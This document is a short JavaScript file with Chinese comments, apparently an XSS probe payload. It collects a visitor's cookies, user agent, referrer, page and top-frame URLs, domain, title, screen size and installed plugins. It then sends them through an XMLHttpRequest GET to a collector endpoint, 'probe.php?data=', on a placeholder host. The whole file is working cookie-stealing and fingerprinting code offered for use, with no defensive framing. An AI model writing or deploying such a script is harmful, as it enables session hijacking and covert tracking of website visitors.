var server = "http://localhost/probe.php?data=",client = {};
client.browser = function(){
	//获取浏览器信息
	var ua = navigator.userAgent.toLowerCase();
	var rwebkit = /(webkit)[ \/]([\w.]+)/;
	var ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/;
	var rmsie = /(msie) ([\w.]+)/;
	var rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/;

	var match = rwebkit.exec(ua) ||
				ropera.exec(ua) ||
				rmsie.exec(ua) ||
				ua.indexOf("compatible") < 0 && rmozilla.exec(ua) ||
				[];
	var result = "";
	if(match[1])
		result += "name:"+match[1];
	else
		result += "";
	if(match[2])
		result += ",version:"+match[2];
	else
		result += "0";
	return result;
}();
client.ua = navigator.userAgent;
client.lang = navigator.language;
client.referrer = document.referrer;
client.location = location.href;
client.toplocation = top.location.href;
client.cookie = document.cookie;
client.domain = document.domain;
client.title = document.title;
client.screen = "height:"+screen.height+",width:"+screen.width;

client.plugins = function(){
	//获取插件信息
	var p = [];
	var len = navigator.plugins.length;
	for(var i = 0;i<len;i++){
		p.push(navigator.plugins[i].name);
	}
	return p;
}();

//console.log(JSON.stringify(client));


server += encodeURIComponent(JSON.stringify(client));
//ajax发送数据
if(window.XMLHttpRequest){
	var xhr = new XMLHttpRequest();
}else{
	var xhr = new ActiveObject("Microsoft.XMLHTTP");
}
xhr.onreadystatechange = function(){
	if(xhr.readystate == 4){
		// if(xhr.status >= 200 && xhr.status < 300){
		// 	alert("Sucess");
		// }else{
		// 	alert("Error");
		// }
		// alert("success");
	}
}
xhr.open("get",server);
xhr.send(null);